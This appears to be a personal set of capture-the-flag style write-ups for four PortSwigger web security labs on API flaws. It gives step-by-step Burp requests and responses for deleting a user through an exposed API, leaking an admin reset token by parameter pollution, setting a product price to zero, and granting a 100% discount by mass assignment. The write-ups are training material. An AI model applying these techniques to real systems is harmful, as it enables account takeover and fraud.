@@ -1,0 +1,105 @@
+Task 1:
+///Lab: Exploiting an API endpoint using documentation///
+
+Open the site in burp, log in and change your email to anything. Check http history. There will be a PATCH /api/user/wiener request. Send it to request. Modify the request and delete the wiener part from the url.
+You will get an 400 bad request. Now delete user part too so the url will be /api. And you will get 302 found. So check this in browser, and you will see this:
+GET	/user/[username: String]	{ }	200 OK, User
+DELETE	/user/[username: String]	{ }	200 OK, Result
+PATCH	/user/[username: String]	{"email": String}	200 OK, User
+
+all you have to do not is to modify the request method to DELETE and the url to /api/user/carlos, send the request, and thats all.
+
+Task 2:
+///Lab: Exploiting server-side parameter pollution in a query string///
+
+Open the site in burp. To solve the lab we have to log in as administrtator. On the My account page there is a forgot password option, click on it, and as username type administrator in.
+Check http history and send the POST /forgot-password request to repeater. Lets play with this request. Modify the administrator name to administratorxy-->you will get invalid username.
+So add a new paramterer like administrator&1=1---> Parameter is not supported (always use url encode). Now change it to administrator#--->Field not specified...okay we have a clue. Lets specify the field parameter:
+administrator&field=1: --> {"type":"ClientError","code":400,"error":"Invalid field."
+Send this request to intruder. Add a postition to the '1' parameter, and in payload configuration load from a list called: Server-side variable names. Start the attack, and check all the 200 responses.
+I got 2: email and username. if i type field=username# ---> {"result":"administrator","type":"username"}
+Now from the http history check this request:
+GET /static/js/forgotPassword.js
+In this javascript there is a line:
+  {
+        window.location.href = `/forgot-password?reset_token=${resetToken}`;
+    }
+Lets try this reset_token as field: {"result":"fn9zeqlq2r2mchyhmft4gtb564reb8mn","type":"reset_token"}
+So we have a url and a reset token...together:
+https://0a5a00530463104c81217a5c00ab003b.web-security-academy.net/forgot-password?reset_token=fn9zeqlq2r2mchyhmft4gtb564reb8mn
+Set a new password, log in, and delete carlos.
+
+Task 3:
+///Lab: Finding and exploiting an unused API endpoint///
+
+Open the site in burp, log in as wiener/peter, add the leather jacket to you cart, try to purchase it, then remove from the cart, and check httpy history. Check the /resources/js/api/productPrice.js file.
+There is this line:
+   fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)
+So this is where the site fetching the products price. Check this request: GET /api/products/1/price HTTP/2 and send it to repeater.
+Change the request method to OPTIONS. As you can see its not allowed, but PATCH is allowed, so change it to PATCH:
+{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
+Add a new header: Content-Type: application/json and an empty json object: {}
+
+{"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
+
+So we have to add the price value to the object:
+
+{
+"price" :0 }
+response: 
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 17
+
+{"price":"$0.00"}
+so we updated the leadher jacket's price to 0. Refresh the site in the browser, and add the leather jacket to your cart for 0$
+
+Task 4:
+///Lab: Exploiting a mass assignment vulnerability///
+
+Open the site in burp, log in as wiener, add the leather jacket to your cart then check the requests in http history. From the GET /resources/js/api/checkout.js HTTP/2 request:
+   fetch(
+        getApiEndpoint(),
+        {
+            method: 'POST',
+            body: JSON.stringify(cachedOrder)
+        }
+    )
+        .then(res => res.headers.get("Location"))
+        .then(loc => window.location = loc);
+This indicates us that if we will use POST method, we can modify the api endpoint. Now lets check the endpoint request:
+GET /api/checkout HTTP/2
+And in response:
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 153
+
+{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
+
+Send it to repeater, and change the request method to POST and add an empty json object: {}...response:
+{"error":"Key order: Key chosen_products: undefined is not an array"}
+So copy the full body part from the GET response:
+POST /api/checkout HTTP/2
+Host: 0afc00f4046267eb80d56cf2001600df.web-security-academy.net
+Cookie: session=wLjDK6gb71euHXYzU7CmcuImKpjezFAH
+...
+...
+Content-Length: 155
+
+{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
+
+I've tried to change the item price to 0, didn't work, So ive tried to change the discount percentage to 10, and i got this:
+HTTP/2 201 Created
+Location: /cart?err=INSUFFICIENT_FUNDS
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+Now change it to 100...:
+HTTP/2 201 Created
+Location: /cart/order-confirmation?order-confirmed=true
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+And we solved the lab.
